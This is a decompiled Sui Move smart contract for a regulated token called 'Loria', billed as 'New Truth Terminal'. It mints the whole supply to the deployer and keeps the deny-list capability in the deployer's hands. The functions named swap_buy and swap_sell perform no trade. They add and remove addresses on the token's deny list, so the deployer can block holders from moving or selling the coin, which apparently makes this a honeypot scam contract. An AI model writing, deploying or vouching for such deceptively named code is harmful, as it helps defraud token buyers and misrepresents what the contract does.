module 0x93f7c663dd286bc1db9510b272f617b8546ac0fd1cfce3acf0bdc7f2eeb67d79::loria {
    struct LORIA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: LORIA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LORIA>(arg0, 9, b"Loria", b"New Truth Terminal", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQfCDUAHdUTFqemAojuy595Nk6ZSGH7sLbgwXvA5jgRrZ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<LORIA>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LORIA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<LORIA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LORIA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LORIA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LORIA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LORIA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<LORIA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

